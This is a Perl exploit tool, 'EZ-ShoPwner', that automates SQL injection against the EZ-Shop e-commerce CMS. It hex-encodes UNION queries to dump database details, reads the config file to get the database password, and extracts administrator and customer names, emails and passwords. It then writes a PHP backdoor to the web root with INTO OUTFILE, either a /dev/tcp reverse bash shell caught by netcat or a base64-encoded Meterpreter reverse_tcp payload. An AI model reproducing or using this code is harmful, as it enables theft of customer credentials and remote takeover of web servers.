#!/usr/bin/perl
#
# --------------------------------------------------------------------------------------------------------------------
# EZ-ShoPwner [EZ-Shop's PWNING tool] v.0.1
#
# Coded by mr.pr0n - http://s3cure.gr - (@_pr0n_) 
# (C)opyleft - 08/2011
#
# EZ-ShoPwner is a fully automated pwning tool for the EZ-Shop Content Managment System (CMS).
# EZ-Shop, is an open source e-Commerce Content Managment System.
#
# You can download -for free- the EZ-Shop Content Managment System :
# 		[+] http://sourceforge.net/projects/ez-shop/files/ecommerce-installer-fc-1.0.2.zip/download
#
# Credits for the discovery of this vulnerability goes to Giovanni Buzzin, "Osirys".
# Please, don't forget that "EZ-Shopwner tool created for educational purpose."
#
# EZ-ShoPwner -pwning tool- tested on BackTrack 5 (Revolution).
#
# Needed tools :
#		[+] xterm
#		[+] Metasploit Framework (http://www.metasploit.com/)
#
# --------------------------------------------------------------------------------------------------------------------
#

use LWP::UserAgent;

print "                                                                                         \n";
print " _pWn_ _PwN_    ____  _                                                                  \n";
print "| ____|__  /   / ___|| |__   ___  _ ____      ___ __   ___ _ __                          \n";
print "|  _|   / /____\\___ \\| '_ \\ / _ \\| '_ \\ \\ /\\ / / '_ \\ / _ \\ '__|                \n";
print "| |___ / /|_____|__) | | | | (_) | |_) \\ V  V /| | | |  __/ |                           \n";
print "|_____/____|   |____/|_| |_|\\___/| .__/ \\_/\\_/ |_| |_|\\___|_|                        \n";
print "                                 |_| ...the evil EZ-Shop's PWNING tool [!] 		\n";

# -------------------------------------
# Enter the target's options.
# -------------------------------------
print "\nEnter the target (e.g.: http://www.target.gr)";
print "\n> ";
$target=<STDIN>;
chomp($target);
$target = "http://".$target if ($target !~ /^http:/);

print "\nEnter the EZ-Shop's directory (e.g.: ezshop)";
print "\n> ";
$dir=<STDIN>;
chomp($dir);

$target = $target."/".$dir."/";

# ----------------------------------------
# The vulnerable parameter.
# ----------------------------------------
$vuln = "specialoffer.php?specialid="; 

# For more information about the vulnerability check:
# http://www.exploit-db.com/exploits/17170/

# ----------------------------------------
# The vulnerable column.
# ----------------------------------------
$general = "3";

# --------------------------------------
# Checking if the target is vulenerable.
# --------------------------------------
print "\n[+] Checking if the target is vulenerable... \n";
sleep(3);
$check = "1' UNION ALL SELECT 1,2,concat(0x21,$general,0x21),4,5#";
$check =~ s/(.)/sprintf("%x",ord($1))/eg;
$sqli2 ="0x"."$check";
$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
$int = LWP::UserAgent->new() or die;
$check=$int->get($target.$vuln.$sqli1);

if ($check->content =~ m/!(.*)!/g)
{
	print "[+] Target, seem to be vulnerable! \n";
	sleep(3);

	# -----------------
	# The Main Menu.
	# -----------------
	menu:;
	print "\n[+] Main Menu:\n";
	print "    1. Export database information.\n";
	print "    2. Export Infomation_Schema (Tables / Columns).\n";
	print "    3. Export administrator(s) account(s)\n";
	print "    4. Export customer(s) account(s).\n";
	print "    5. Get a shell I  (netcat).\n";
	print "    6. Get a shell II (metasploit).\n";
	print "    7. Exit.\n";
	 
	print "> ";
	$option=<STDIN>;
	if ($option!=1 && $option!=2 && $option!=3 && $option!=4 && $option!=5 && $option!=6 && $option!=7)
	{
		print "Oups, wrong option.\nPlease, try again.\n";
		goto menu;
	}
	
	# Options.
	if ($option==1)
	{&database} 		# Export database information.
	if ($option==2)
	{&info_schema}		# Export Infomation_Schema (Tables / Columns).
	if ($option==3)
	{&ext_admin}		# Export administrator(s) account(s)
	if ($option==4)
	{&ext_cust}		# Export customer(s) account(s).
	if ($option==5)
	{&netcat}		# Upload a backdoor to the target and get a shell (with netcat).
	if ($option==6)
	{&metasploit}		# Upload a backdoor to the target and get a shell (with metasploit).
	if ($option==7)
	{&quit}			# Exit.

	# -----------------------------------------
	# Export database information.
	# -----------------------------------------
	sub database
	{

		print "\n[+] Exporting Database information... \n";
		sleep(3);

		# --------------------------------------
		# Server name.
		# --------------------------------------
		$db_user = "user()";
		$check = "1' UNION ALL SELECT 1,2,concat(0x21,$db_user,0x21),4,5#";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);
		if ($check->content =~ m/\@(.*)!/g)
		{
			$db_user = $1;
			print "    [*] Server name      : "."$db_user\n";;
		}
		else
		{
			print "    [-] Server name, not found.\n";
		}

		# --------------------------------------	
		# Database Version.
		# --------------------------------------
		$db_version = "version()";
		$check = "1' UNION ALL SELECT 1,2,concat(0x21,$db_version,0x21),4,5#";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);
		if ($check->content =~ m/!(.*)!/g)
		{
			$db_version = $1;
			print "    [*] Database version : "."$db_version\n";
		} 
		else 
		{
			print "    [-] Database version, not found.\n";
		}

		# --------------------------------------
		# Database Name.
		# --------------------------------------
		$db_name = "database()";
		$check = "1' UNION ALL SELECT 1,2,concat(0x21,$db_name,0x21),4,5#";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);
		if ($check->content =~ m/!(.*)!/g)
		{
			$db_name = $1;
			print "    [*] Database name    : "."$db_name\n";
		} 
		else 
		{
			print "    [-] Database's name, not found.\n";
		}

		# --------------------------------------
		# Database User.
		# --------------------------------------
		$db_user = "user()";
		$check = "1' UNION ALL SELECT 1,2,concat(0x21,$db_user,0x21),4,5#";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);
		if ($check->content =~ m/!(.*)\@/g)
		{
			$db_user = $1;
			print "    [*] Database user    : "."$db_user\n";
		}
		else
		{
			print "    [-] Database user, not found.\n";
		}

		# -----------------------------------------------------------------
		#  Load "system/config.inc.php" for Database Password.
		# -----------------------------------------------------------------
		$file = "/var/www/html/".$dir."/system/config.inc.php"; 		# <--- Change this if needed.
		$file =~ s/(.)/sprintf("%x",ord($1))/eg;
		$file ="0x"."$file";
		$load_file = "LOAD_FILE($file)";

		$check = "1' UNION ALL SELECT 1,2,concat(0x21,$load_file,0x21),4,5 #";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";

		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);
		if ($check->content =~ m/PASSWORD','(.*)'/g)
		{
			$PASSWORD = $1;
			print "    [*] Password         : "."$1\n";
		}
		else 
		{
			print "    [-] Database's password, not found.\n";
		}
	goto menu;
	}

	# --------------------------------------------------
	# # Export Infomation_Schema (Tables / Columns).
	# --------------------------------------------------
	sub info_schema
	{
		print "\n[+] Exporting Information_Schema (Tables / Columns)...\n";
		sleep(3);

		$check = "1' UNION ALL SELECT 1,2,concat(0x21,table_name,0x21),4,5 FROM Information_Schema.tables #";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);
		if ($check->content =~ m/!(.*)!/g)
		{
			$first_table = $1;
			print "    [*] $first_table\n";
			$first_table = "'".$first_table."'";
			$check = "1' UNION ALL SELECT 1,2,concat(0x21,column_name,0x21),4,5 FROM Information_Schema.columns WHERE table_name=($first_table) #";
			$check =~ s/(.)/sprintf("%x",ord($1))/eg;
			$sqli2 ="0x"."$check";
			$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
			$int = LWP::UserAgent->new() or die;
			$check=$int->get($target.$vuln.$sqli1);
			if ($check->content =~ m/!(.*)!/g)
			{
				$first_column = $1;
				print "        [*] $first_column\n";
				$first_column = "'".$first_column."'";
				for ($i=1; $i <= 20; $i++)
				{
					$check = "1' UNION ALL SELECT 1,2,concat(0x21,column_name,0x21),4,5 FROM Information_Schema.columns WHERE table_name=$first_table AND column_name NOT IN ($first_column) #";
					$check =~ s/(.)/sprintf("%x",ord($1))/eg;
					$sqli2 ="0x"."$check";
					$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
					$int = LWP::UserAgent->new() or die;
					$check=$int->get($target.$vuln.$sqli1);
					if ($check->content =~ m/!(.*)!/g)
				   	{
				   		$next_column = $1;
				     		print "        [*] $next_column\n";
						$next_column = "'".$next_column."'";
				     		$first_column = $first_column.",".$next_column;
					}
				}
			}
			for ($i=1; $i <= 50; $i++)
			{
				$check = "1' UNION ALL SELECT 1,2,concat(0x21,table_name,0x21),4,5 FROM Information_Schema.tables WHERE table_name NOT IN ($first_table) #";
				$check =~ s/(.)/sprintf("%x",ord($1))/eg;
				$sqli2 ="0x"."$check";
				$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
				$int = LWP::UserAgent->new() or die;
				$check=$int->get($target.$vuln.$sqli1);
				if ($check->content =~ m/!(.*)!/g)
			   	{
			   		$next_table = $1;
			     		print "\n    [*] $next_table\n";
					$next_table = "'".$next_table."'";
					$check = "1' UNION ALL SELECT 1,2,concat(0x21,column_name,0x21),4,5 FROM Information_Schema.columns WHERE table_name=($next_table) #";
					$check =~ s/(.)/sprintf("%x",ord($1))/eg;
					$sqli2 ="0x"."$check";
					$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
					$int = LWP::UserAgent->new() or die;
					$check=$int->get($target.$vuln.$sqli1);
					if ($check->content =~ m/!(.*)!/g)
					{
						$first_column = $1;
						print "        [*] $first_column\n";
						$first_column = "'".$first_column."'";
						for ($i=1; $i <= 40; $i++)
						{
							$check = "1' UNION ALL SELECT 1,2,concat(0x21,column_name,0x21),4,5 FROM Information_Schema.columns WHERE table_name=($next_table) AND column_name NOT IN ($first_column) #";
							$check =~ s/(.)/sprintf("%x",ord($1))/eg;
							$sqli2 ="0x"."$check";
							$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
							$int = LWP::UserAgent->new() or die;
							$check=$int->get($target.$vuln.$sqli1);
							if ($check->content =~ m/!(.*)!/g)
						   	{
						   		$next_column = $1;
						     		print "        [*] $next_column\n";
								$next_column = "'".$next_column."'";
						     		$first_column = $first_column.",".$next_column;
							}
						}
					}
					$first_table = $first_table.",".$next_table;					
				}
			}
		}
		else
		{
			print "Information_Schema.tables, not accessible.\n";
		}
	goto menu;
	}

	# -------------------------------------------
	# Export administrator(s) account(s).
	# -------------------------------------------
	sub ext_admin
	{
		print "\n[+] Exporting administrator(s) account(s)... \n";
		sleep(3);

		$adm_user_pass = "0x21,varadminfname,0x3a,varadminname,0x3a,varpassword,0x3a,varemail,0x21";
		# Check for 20 administrator accounts!
		for ($i=1; $i<=20; $i++)   # <--- Change this if needed.
		{
			$check = "1' UNION ALL SELECT 1,2,concat($adm_user_pass),4,5 FROM tbladmin WHERE intid=".$i."#";
			$check =~ s/(.)/sprintf("%x",ord($1))/eg;
			$sqli2 ="0x"."$check";
			$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
			$int = LWP::UserAgent->new() or die;
			$check=$int->get($target.$vuln.$sqli1);
			if ($check->content =~ m/!(.*):(.*):(.*):(.*)!/g)
			{
		
				$realname = $1;
				$username = $2;
				$password = $3;
				$email    = $4;
	
				print "    [*] Name      : $realname    \n";
				print "    [*] Username  : $username    \n";
				print "    [*] Password  : $password    \n";
				print "    [*] Email     : $email       \n\n";
			
			}
		}
	goto menu;
	}

	# ----------------------------------------
	#  Export customer(s) account(s).
	# ----------------------------------------
	sub ext_cust
	{
		print "\n[+] Exporting customer(s) account(s)... \n";
		sleep(3);

		$cust_user_pass = "0x21,varcustemail,0x3a,varcustpassword,0x21";
		# Check for 20 customers accounts!
		for ($i=1; $i<=20; $i++)  # <--- Change this if needed.
		{
			$check = "1' UNION ALL SELECT 1,2,concat($cust_user_pass),4,5 FROM tblcustomers WHERE intcusid=".$i."#";
			$check =~ s/(.)/sprintf("%x",ord($1))/eg;
			$sqli2 ="0x"."$check";
			$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
			$int = LWP::UserAgent->new() or die;
			$check=$int->get($target.$vuln.$sqli1);
			if ($check->content =~ m/!(.*):(.*)!/g)
			{
				$email = $1;
				$password = $2;

				print "    [*] Email	  : $email \n";
				print "    [*] Password  : $password\n\n";
			}
		}
	goto menu;
	}

	# -------------------------------------------------------------------------
	#  Upload a backdoor to target and get a shell (netcat).
	# -------------------------------------------------------------------------
	sub netcat
	{
		print "\nEnter the IP address for the reverse connection (e.g.: 192.168.178.25)";
		print "\n> ";
		$ip=<STDIN>;
		chomp($ip);

		print "\nEnter the port to connect back on (e.g.: 4444)";
		print "\n> ";
		$port=<STDIN>;
		chomp($port);

		# The "netcat without netcat" trick,
		# takes the /dev/tcp socket programming feature and uses it to redirect /bin/bash to a remote system.
		$payload = 
		"<?php ".
		"system('/bin/bash -i > /dev/tcp/$ip/$port 0<&1 2>&1');".
		"?>";
		
		#Encode the payload to Hex.
		$payload =~ s/(.)/sprintf("%x",ord($1))/eg;
		$payload ="0x"."$payload";

		$filename = "config_".int(rand()*1011).".php";

		# The path where the backdoor will uploaded.
		$path = $dir."/".$filename;    
       
		$nc= "nc -lvp $port";
		print "\n[+] Wait for reverse connection on port $port...\n";
		system("xterm -e $nc &");

		print "[+] Uploading the backdoor to server... \n";
		$junk="''";
		$check = "1' UNION ALL SELECT $junk,$junk,$junk,$junk,$payload INTO OUTFILE '/var/www/html/$path'#";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";
		
		sleep(10);
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);

		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$filename);
	
		if ($check->content =~ m/was not found/g)
		{
			print "[-] Failed to upload the backdoor!\n\n";
		}

	goto menu;
	}

	# -------------------------------------------------------------------------
	#  Upload a backdoor to target and get a shell (metasploit).
	# -------------------------------------------------------------------------
	sub metasploit
	{
		print "\nEnter the IP address for the reverse connection (e.g.: 192.168.178.25)";
		print "\n> ";
		$ip=<STDIN>;
		chomp($ip);

		print "\nEnter the port to connect back on (e.g.: 4444)";
		print "\n> ";
		$port=<STDIN>;
		chomp($port);

		# The payload created with metasploit (msfpayload):
		# "msfpayload php/meterpreter/reverse_tcp LHOST=192.168.178.25 LPORT=4444 R | msfencode -e php/base64 -t raw -o /root/ezshopwner.php"
		# ... and encoded (msfencode) in base64!

		$payload = "'<?php ". # <--- Don't remove this.
		####
		# Create your paylaoad and replace here.
		# "msfpayload php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> R | msfencode -e php/base64 -t raw -o /root/ezshopwner.php"
		####
		"eval(base64_decode(Izw.chr(47).cGhwCgplcnJvcl9yZXBvcnRpbmcoMCk7CiMgVGhlIHBheWxvYWQgaGFuZGxlciBvdmVyd3JpdGVz". # <-- Replace from here..
		"IHRoaXMgd2l0aCB0aGUgY29ycmVjdCBMSE9TVCBiZWZvcmUgc2VuZGluZwojIGl0IHRvIHRoZSB2aWN0aW0uCiRpcCA9ICcxOTIuMTY4LjE".
		"3OC4yNSc7CiRwb3J0ID0gNDQ0NDsKaWYgKEZBTFNFICE9PSBzdHJwb3MoJGlwLCAiOiIpKSB7CgkjIGlwdjYgcmVxdWlyZXMgYnJhY2tldH".
		"MgYXJvdW5kIHRoZSBhZGRyZXNzCgkkaXAgPSAiWyIuICRpcCAuIl0iOwp9CgppZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJ".
		"iYgaXNfY2FsbGFibGUoJGYpKSB7CgkkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7Cgkkc190eXBlID0gJ3N0cmVhbSc7Cn0gZWxz".
		"ZWlmICgoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7CgkkcyA9ICRmKCRpcCwgJHBvcnQpOwoJJHNfdHlwZSA9ICd".
		"zdHJlYW0nOwp9IGVsc2VpZiAoKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsKCSRzID0gJGYoQUZfSU5FVC".
		"wgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwoJJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7CglpZiAoISRyZXMpIHsgZ".
		"GllKCk7IH0KCSRzX3R5cGUgPSAnc29ja2V0JzsKfSBlbHNlIHsKCWRpZSgnbm8gc29ja2V0.IGZ1bmNzJyk7Cn0KaWYgKCEkcykgeyBkaWU".
		"oJ25vIHNvY2tldCcpOyB9Cgpzd2l0Y2ggKCRzX3R5cGUpIHsgCmNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOw".
		"pjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsKfQppZiAoISRsZW4pIHsKCSMgV2UgZmFpbGVkIG9uI".
		"HRoZSBtYWluIHNvY2tldC4gIFRoZXJlJ3Mgbm8gd2F5IHRvIGNvbnRpbnVlLCBzbwoJIyBiYWlsCglkaWUoKTsKfQokYSA9IHVucGFjaygi".
		"TmxlbiIsICRsZW4pOwokbGVuID0gJGFbJ2xlbiddOwoKJGIgPSAnJzsKd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7Cglzd2l0Y2ggKCR".
		"zX3R5cGUpIHsgCgljYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7CgljYXNlICdzb2NrZX".
		"QnOiAkYiAuPSBzb2NrZXRfcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7Cgl9Cn0KCiMgU2V0IHVwIHRoZSBzb2NrZXQgZm9yI".
		"HRoZSBtYWluIHN0YWdlIHRvIHVzZS4KJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOwokR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190". 
		"eXBlOwpldmFsKCRiKTsKZGllKCk7Cg));".										# <-- ...to here!
		####
		" ?>'";	# <--- Don't remove this.

		# The backdoor name.
		$filename = "config_".int(rand()*1010).".php";            

		# The path where the backdoor will uploaded.
		$path = $dir."/".$filename;
	
		print "\n[+] Executing the msfcli... \n";
		$msfcli = "msfcli multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port E";
		system("xterm -e $msfcli &");

		print "[+] Uploading the backdoor to server... \n";
		$junk="''";
		$check = "1' UNION ALL SELECT $junk,$junk,$junk,$junk,$payload INTO OUTFILE '/var/www/html/$path'#";
		$check =~ s/(.)/sprintf("%x",ord($1))/eg;
		$sqli2 ="0x"."$check";
		$sqli1 = "1' UNION ALL SELECT 1,2,".$sqli2."%23";

		sleep(40);
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$vuln.$sqli1);
	
		$int = LWP::UserAgent->new() or die;
		$check=$int->get($target.$filename);
	
		if ($check->content =~ m/was not found/g)
		{
			print "[-] Failed to upload the backdoor!\n\n";
		}

	goto menu;
	}

	# ----------------------
	#  Exit EZ-ShoPwner
	# ----------------------
	sub quit
	{
		print "Exiting EZ-ShoPwner..\n";
		sleep(1);
		exit(0);
	}
}

else 
{
        print "[-] Target, *NOT* seem to be vulnerable.\n\n";
}

# --------------------------------------------------------------------------------------------
# ...is *NOT* guarantee that EZ-Shopwner will work against your target server(s).
# --------------------------------------------------------------------------------------------

# EOF :-)
